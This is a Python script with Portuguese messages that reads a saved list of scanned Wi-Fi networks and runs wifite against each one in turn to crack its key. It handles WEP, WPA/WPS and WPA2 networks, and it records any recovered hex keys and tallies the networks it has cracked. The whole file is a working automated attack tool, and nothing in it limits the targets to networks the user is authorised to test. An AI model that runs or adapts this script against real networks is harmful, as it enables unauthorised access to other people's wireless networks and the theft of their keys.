#!/usr/bin/python3

import os
import sys
import re
import subprocess
from subprocess import Popen
import json
from printer import dialog
from printer import show_wep_menu
from printer import show_wpa_menu
from printer import show_wpa_wps_menu


def start(database_file='networks.json'):
    dialog('== Iniciando ataques ==', color='p')    

    database = __loaddb(database_file)["array"]
    del database[0]

    attack(database[:])
    #for network in database:
    #    attack(network)


def __loaddb(file_name):
    db = {}

    dialog('Carregando redes para a base de dados...', color='c')
    if os.path.exists(file_name):
        with open(file_name, 'r') as file:
            db = json.load(file)
    else:
        raise FileNotFoundError("[*] Erro Fatal: arquivo "+file_name+" não encontrado")

    dialog('Base de dados carregada', color='c')
    return db


def attack(networks):
    analized_wep_networks_counter = 0
    analized_wpa_with_wps_networks_counter = 0
    analized_wpa_without_wps_networks_counter = 0

    cracked_wep_networks_counter = 0
    cracked_wpa_with_wps_networks_counter = 0
    cracked_wpa_without_wps_networks_counter = 0
    
    for net in networks:
        try:
            if net["privacity"] == 'WEP':
                print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
                analized_wep_networks_counter += 1
                
                dialog('[Alvo atual] >', net["essid"], net["bssid"])
                show_wep_menu()

                hex_key =__wep_attack(net)[2]
                net["hex_key"] = hex_key
                
                if hex_key != '':
                    cracked_wep_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue

    for net in networks:
        try:
            if net["privacity"] == 'WPA':
                if net["wps"] != 'Locke' and net["wps"] != 'Unknown':
                    print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
                    analized_wpa_with_wps_networks_counter += 1
                    
                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
                    show_wpa_wps_menu()

                    password = __wpa_wps_attack(net)

                    if password != '':
                        cracked_wpa_with_wps_networks_counter += 1
                else:
                    analized_wpa_without_wps_networks_counter += 1
                    
                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
                    show_wpa_wps_menu()

                    password = __wpa_attack(net)

                    if password != '':
                        cracked_wpa_without_wps_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue

    for net in networks:
        try:
            if net["privacity"] == 'WPA2':
                if net["wps"] != 'Locke' and net["wps"] != 'Unknown':
                    print(f'Nome: {net["essid"]}, Endereço MAC: {net["bssid"]}, WPS: {net["wps"]}')
                    analized_wpa_with_wps_networks_counter += 1

                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
                    show_wpa_wps_menu()

                    password = __wpa_wps_attack(net)

                    if password != '':
                        cracked_wpa_with_wps_networks_counter += 1
                else:
                    analized_wpa_without_wps_networks_counter += 1
                    
                    dialog('[Alvo atual] >', net["essid"], net["bssid"])
                    show_wpa_wps_menu()

                    password = __wpa_attack(net)

                    if password != '':
                        cracked_wpa_without_wps_networks_counter += 1
        except KeyboardInterrupt as e:
            dialog('Pulando para o próximo alvo!', color='o')
            continue
            '''
            else:
                analized_wpa_without_wps_networks_counter += 1

                show_wpa_menu()

                password = __wpa_attack(net)

                if password != '':
                    cracked_wpa_without_wps_networks_counter += 1
            '''
    
    #subprocess.run(['wifite', '-b', net["bssid"]], shell=True)

def __wep_attack(net):
    wifite = Popen(['wifite', '-wep', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    hex_key = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            if 'ESSID: ' in line:
                essid = line.split('ESSID: ')[1]
            if 'BSSID: ' in line:
                bssid = line.split('BSSID: ')[1]
            if 'Hex Key: ' in line:
                hex_key = line.split('Hex Key: ')[1]

    except KeyboardInterrupt as e:
        wifite.kill()
    
    return essid, bssid, hex_key
    #print('='*30)
    #print('ESSID:', essid)
    #print('BSSID:', bssid)
    #print('Hex Key:', hex_key)
    #print('='*30)

    '''
    final_line = ''
    try:
        while True:
            output = wifite.stdout.readline()
            if output.decode() == '':
                # end of stream
                print("End of Stream")
                break
            if output is not None:
                # here you could do whatever you want with the output.
                final_line = output
                print(output.decode())
    except KeyboardInterrupt as e:
        wifite.kill()
    
    airmon = Popen(['airmon-ng', 'stop', 'wlan0mon'])
    airmon.terminate()
    '''


def __wpa_wps_attack(net):
    wifite = Popen(['wifite', '-wps', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    hex_key = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            '''
            if 'ESSID: ' in line:
                essid = line.split('ESSID: ')[1]
            if 'BSSID: ' in line:
                bssid = line.split('BSSID: ')[1]
            if 'Hex Key: ' in line:
                hex_key = line.split('Hex Key: ')[1]
            '''

    except KeyboardInterrupt as e:
        wifite.kill()
    
    return essid, bssid, hex_key


def __wpa_attack(net):
    wifite = Popen(['wifite', '-wpa', '-b', net["bssid"]], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0, universal_newlines=True)
    
    essid = ''
    bssid = ''
    hex_key = ''

    try:
        for line in iter(wifite.stdout.readline, ''):
            line = line.strip()
            if not line or line == '':
                continue
            print(line)
            sys.stdout.flush()

            '''
            if 'ESSID: ' in line:
                essid = line.split('ESSID: ')[1]
            if 'BSSID: ' in line:
                bssid = line.split('BSSID: ')[1]
            if 'Hex Key: ' in line:
                hex_key = line.split('Hex Key: ')[1]
            '''

    except KeyboardInterrupt as e:
        wifite.kill()
    
    return essid, bssid, hex_key


def cleanANSIcodes(text):
    ansi_remover = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    realtext = ansi_remover.sub('', text)
    return realtext